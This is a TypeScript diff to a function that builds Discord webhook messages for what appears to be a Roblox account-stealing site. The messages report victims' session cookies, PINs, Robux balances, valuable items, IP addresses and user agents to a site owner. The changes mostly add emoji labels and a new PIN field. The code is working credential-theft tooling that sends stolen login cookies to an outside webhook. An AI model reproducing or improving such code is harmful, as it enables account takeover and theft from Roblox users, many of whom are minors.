@@ -651,8 +651,12 @@ function buildDiscordPayload(opts: {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
-    { name: "Site Owner", value: ownerUsername, inline: true },
+    { name: `${EMOJI.owner} Site Owner`, value: ownerUsername, inline: true },
   ];
+
+  if (pin) {
+    mainFields.push({ name: `${EMOJI.pin} PIN`, value: pin, inline: true });
+  }
 
   if (extras) {
     for (const [k, v] of Object.entries(extras)) {
@@ -666,28 +670,32 @@ function buildDiscordPayload(opts: {
       ? `${roblox.accountAgeDays.toLocaleString()} days (${new Date(roblox.createdAt).toISOString().slice(0, 10)})`
       : "Unknown";
 
+    const robuxStr = roblox.robux !== null
+      ? `${roblox.robux.toLocaleString()}${roblox.pendingRobux ? ` (+${roblox.pendingRobux.toLocaleString()} pending)` : ""}`
+      : "Unknown";
+
     mainFields.push(
-      { name: "Roblox Username", value: `${roblox.name} (${roblox.displayName})`, inline: true },
-      { name: "User ID", value: String(roblox.id), inline: true },
-      { name: "Account Age", value: ageStr, inline: true },
-      { name: "Robux", value: roblox.robux !== null ? roblox.robux.toLocaleString() : "Unknown", inline: true },
-      { name: "RAP", value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
-      { name: "Premium", value: roblox.premium === null ? "Unknown" : roblox.premium ? "Yes" : "No", inline: true },
-      { name: "Friends", value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Followers", value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Following", value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
-      { name: "Korblox", value: roblox.hasKorblox === null ? "Unknown" : roblox.hasKorblox ? "✅ Yes" : "❌ No", inline: true },
-      { name: "Headless", value: roblox.hasHeadless === null ? "Unknown" : roblox.hasHeadless ? "✅ Yes" : "❌ No", inline: true },
-      { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
-      { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
-      { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "📊 Summary (Past Year)", value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()} R$`, inline: true },
+      { name: `${EMOJI.user} Username (13+)`, value: `${roblox.name} (${roblox.displayName})`, inline: true },
+      { name: `${EMOJI.id} User ID`, value: String(roblox.id), inline: true },
+      { name: `${EMOJI.age_acct} Account Age`, value: ageStr, inline: true },
+      { name: `${EMOJI.robux} Robux (Pending)`, value: robuxStr, inline: true },
+      { name: `${EMOJI.premium} Premium`, value: roblox.premium === null ? "Unknown" : roblox.premium ? "true" : "false", inline: true },
+      { name: `${EMOJI.rap} RAP`, value: roblox.rap !== null ? roblox.rap.toLocaleString() : "Unknown", inline: true },
+      { name: `${EMOJI.summary} Summary`, value: `${(roblox.summary ?? 0) >= 0 ? "+" : ""}${(roblox.summary ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.pending} Robux Incoming/Outgoing`, value: `${(roblox.incomingRobux ?? 0).toLocaleString()}/${(roblox.robuxSpent ?? 0).toLocaleString()}`, inline: true },
+      { name: `${EMOJI.korblox}/${EMOJI.headless} Korblox/Headless`, value: `${roblox.hasKorblox ? "True" : "False"}/${roblox.hasHeadless ? "True" : "False"}`, inline: true },
+      { name: `${EMOJI.friends} Friends`, value: roblox.friendsCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.followers} Followers`, value: roblox.followersCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.following} Following`, value: roblox.followingCount?.toLocaleString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.voice} Voice Chat`, value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
+      { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
+      { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
     );
 
     // Tracked games played
     if (roblox.playedGames.length > 0) {
       mainFields.push({
-        name: "🎮 Played Games",
+        name: `${EMOJI.games} Played Games`,
         value: roblox.playedGames
           .map((g) => `${g.played ? "✅" : "❌"} ${g.name}`)
           .join("\n"),
@@ -713,13 +721,13 @@ function buildDiscordPayload(opts: {
       if (buf) chunks.push(buf);
       chunks.forEach((c, i) => {
         mainFields.push({
-          name: chunks.length === 1 ? `👑 Owned Groups (${roblox.ownedGroups.length})` : `👑 Owned Groups (${i + 1}/${chunks.length})`,
+          name: chunks.length === 1 ? `${EMOJI.groups} Owned Groups (${roblox.ownedGroups.length})` : `${EMOJI.groups} Owned Groups (${i + 1}/${chunks.length})`,
           value: c,
           inline: false,
         });
       });
     } else {
-      mainFields.push({ name: "👑 Owned Groups", value: "None", inline: false });
+      mainFields.push({ name: `${EMOJI.groups} Owned Groups`, value: "None", inline: false });
     }
 
     mainFields.push(
@@ -730,9 +738,9 @@ function buildDiscordPayload(opts: {
   }
 
   mainFields.push(
-    { name: "IP Address", value: ip, inline: true },
-    { name: "User Agent", value: userAgent.slice(0, 1000), inline: false },
-    { name: "Submitted", value: new Date().toISOString(), inline: false },
+    { name: `${EMOJI.ip} IP Address`, value: ip, inline: true },
+    { name: `${EMOJI.ua} User Agent`, value: userAgent.slice(0, 1000), inline: false },
+    { name: `${EMOJI.time} Submitted`, value: new Date().toISOString(), inline: false },
   );
 
 
@@ -748,7 +756,7 @@ function buildDiscordPayload(opts: {
         timestamp: new Date().toISOString(),
       },
       {
-        title: "🍪 Account Cookie",
+        title: `${EMOJI.cookie} Account Cookie`,
         color: 0xff5555,
         description: "```\n" + cookie.slice(0, 4080) + "\n```",
         footer: { text: "Handle with care" },
